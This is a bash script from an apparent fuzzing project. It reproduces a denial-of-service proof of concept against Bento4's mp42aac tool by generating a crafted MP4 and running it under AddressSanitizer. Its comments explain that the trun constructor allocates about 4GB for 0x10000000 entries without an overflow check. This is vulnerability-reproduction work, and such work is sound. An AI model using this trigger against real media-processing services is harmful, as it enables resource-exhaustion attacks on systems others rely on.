#!/bin/bash
set -e
POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4FragmentSampleTable_cpp"
cd "$POC_DIR"
python3 "$POC_DIR/vuln_002_gen.py"
# hard_rss_limit_mb=3000: on a 64-bit system the trun constructor allocates 4GB for
# 0x10000000 entries (no overflow check), causing RSS to exceed 3000MB.
# ASAN aborts with "hard rss limit exhausted" - confirming the DoS behavior.
ASAN_OPTIONS="abort_on_error=0:hard_rss_limit_mb=3000:log_path=$POC_DIR/asan_002.log" \
  /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac \
  "$POC_DIR/vuln_002.mp4" /dev/null \
  > "$POC_DIR/vuln_002_result.txt" 2>&1 || true
for f in "$POC_DIR"/asan_002.log.*; do
  [ -f "$f" ] && grep -E "(ERROR|WARNING|runtime error|AddressSanitizer|rss limit)" "$f" >> "$POC_DIR/vuln_002_result.txt" 2>/dev/null || true
done
echo "=== mp42aac exit ===" >> "$POC_DIR/vuln_002_result.txt"
